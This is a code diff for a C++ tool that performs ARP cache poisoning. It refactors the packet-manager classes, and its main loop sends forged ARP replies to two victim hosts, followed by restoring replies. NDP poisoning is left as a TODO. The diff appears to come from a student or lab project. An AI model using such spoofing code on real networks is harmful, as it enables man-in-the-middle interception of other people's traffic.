@@ -4,9 +4,9 @@
 #include <signal.h>
 #include "ARP_packet.h"
 #include "NetworkInterface.h"
-#include "ARP_packetManager.h"
 #include "SpoofArguments.h"
-#include "ICMPv6_packetManager.h"
+#include "PacketManager.h"
+#include "ICMPv6_packet.h"
 
 bool loop = true;
 
@@ -16,17 +16,14 @@ int main(int argc, char **argv) {
     try {
         SpoofArguments arguments(argc, argv);
         NetworkInterface networkInterface(arguments.getInterface());
-        ARP_packetManager *arpPacketManager;
-        ICMPv6_packetManager *icmpv6_packetManager;
+        PacketManager<ARP_packet> arpPacketManager(networkInterface, "arp");
+        PacketManager<ICMPv6_packet> icmpv6PacketManager(networkInterface, "icmp6");
 
         signal(SIGINT, interruptHandler);
         signal(SIGTERM, interruptHandler);
 
         if (arguments.getProtocol() == "arp") {
             /* Perform ARP cache poison */
-
-            arpPacketManager = ARP_packetManager::getInstance();
-            arpPacketManager->init(&networkInterface);
             while (loop) {
                 ARP_packet *arpReply1 = ARP_packet::createReply(
                         networkInterface.getPhysicalAddress(),
@@ -41,8 +38,8 @@ int main(int argc, char **argv) {
                         arguments.getVictim2Ipv4Address()
                 );
 
-                arpPacketManager->send(arpReply1);
-                arpPacketManager->send(arpReply2);
+                arpPacketManager.send(arpReply1);
+                arpPacketManager.send(arpReply2);
 
                 delete arpReply1;
                 delete arpReply2;
@@ -64,22 +61,14 @@ int main(int argc, char **argv) {
                     arguments.getVictim2Ipv4Address()
             );
 
-            arpPacketManager->send(arpReply1);
-            arpPacketManager->send(arpReply2);
+            arpPacketManager.send(arpReply1);
+            arpPacketManager.send(arpReply2);
 
             delete arpReply1;
             delete arpReply2;
-
-            arpPacketManager->clean();
         } else {
             /* Perform NDP cache poison */
-
-            icmpv6_packetManager = ICMPv6_packetManager::getInstance();
-            icmpv6_packetManager->init(&networkInterface);
-
             //TODO create neighbor advertisement packet and send it
-
-            icmpv6_packetManager->clean();
         }
     }
     catch (InvalidArgumentsException &e) {
